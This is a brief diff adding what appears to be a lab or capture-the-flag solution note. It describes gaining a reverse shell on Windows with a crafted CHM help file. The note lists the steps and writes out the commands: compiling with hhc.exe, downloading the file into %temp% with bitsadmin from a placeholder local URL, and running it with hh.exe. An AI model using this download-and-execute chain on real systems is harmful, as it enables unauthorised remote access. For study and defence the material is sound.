@@ -1,0 +1,20 @@
+
+Solution:
+	
+	Create CHM file to get reverse shell
+	Host CHM file on Remote Server
+	Get Limited Shell of Traget System
+	Using Bitsadmin Download File in temp
+	Run CHM File using hh.exe
+
+
+
+Commands:
+To Compile HTML and hhp file
+C:\Program Files (x86)\HTML Help Workshop\hhc.exe C:\users\root\Desktop\Trillium.hhp
+
+Download File:
+bitsadmin /transfer n http://127.0.0.1:1234/test.chm %temp%\out.chm
+
+Execute:
+hh.exe %temp%\out.chm
